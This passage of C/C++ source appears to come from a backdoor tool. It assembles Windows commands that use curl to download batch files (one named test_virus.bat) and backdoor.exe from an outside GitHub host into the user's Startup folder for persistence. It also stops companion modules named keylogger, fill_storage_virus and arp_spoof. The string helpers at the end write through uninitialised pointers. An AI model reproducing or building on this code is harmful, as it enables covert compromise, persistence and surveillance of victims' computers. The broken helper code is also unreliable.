        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/test_move.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test_move.bat\" && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/extensions/test_virus.bat -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test_virus.bat\" ";
        if (ebuf.find("run") != string::npos)
        {
            command += " && IF EXIST \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.bat\" ( start \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test_move.bat\" ) ELSE ( echo; ) ";
        }
    }

    if (default_commad == command)
    {
        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/backdoor.exe -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.exe\"";
    }

    ebuf = command;

    return ebuf;
}

string CE_StopExt(string buffer)
{
    string ebuf = buffer;
    if (ebuf.find("keylog") != string::npos)
    {
        ebuf = "powershell -Command \"Stop-Process -Name \"keylogger\"\" && powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\ProgramData\\Ms\\keylogger.exe\"} | Stop-Process -WhatIf\"";
    }
    else if (ebuf.find("fill_storage") != string::npos)
    {
        ebuf = "powershell -Command \"Stop-Process -Name \"fill_storage_virus\"\" && powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\ProgramData\\Ms\\fill_storage_virus.bat\"} | Stop-Process -WhatIf\"";
    }
    // else if (ebuf.find("networks_profile") != string::npos)
    // {
    //     ebuf = "powershell -Command \"Stop-Process -Name \"networks_profile\"\" && powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\ProgramData\\Ms\\networks_profile.exe\"} | Stop-Process -WhatIf\"";
    // }

    else if (ebuf.find("arp_spoof") != string::npos)
    {
        ebuf = "powershell -Command \"Stop-Process -Name \"arp_spoof\"\" && powershell -Command \"Get-Process | Where-Object {$_.Path -like \"C:\\ProgramData\\Ms\\arp_spoof.exe\"} | Stop-Process -WhatIf\"";
    }

    return ebuf;
}

int strincludes(char *strVar, char *buffer)
{
    char *str;
    strcpy(str, strVar);
    if (!str)
        return 0;

    //  char *buffer_len = strlen(buffer);

    char *token = strtok(str, " ");
    while (token != NULL)
    {
        printf("%s --- %s\n", buffer, token);
        if (strcmp(buffer, token) == 0)
        {
            return 1;
        }
        token = strtok(NULL, " ");
    }
    return 0;
}

char *strsub(char str[], int slice_from, int slice_to)
{
    if (!str[slice_from + 1])
    {
        return NULL;
    }

    char *buffer;
    size_t str_len, buffer_len;
    if (slice_to < 0 && slice_from > slice_to)
    {
        str_len = strlen(str);
        if (abs(slice_to) > str_len - 1)
        {
            return NULL;
        }

        if (abs(slice_from) > str_len)
        {
            return NULL;
        }

        buffer_len = slice_to - slice_from;
        str += (str_len + slice_from);
    }
    else if (slice_from >= 0 && slice_to > slice_from)
    {
        str_len = strlen(str);

        if (slice_from > str_len - 1)
        {
            return NULL;
        }

        buffer_len = slice_to - slice_from;
        str += slice_from;
    }

    // buffer = calloc(buffer_len, sizeof(char));
    strncpy(buffer, str, buffer_len);
    return buffer;
}
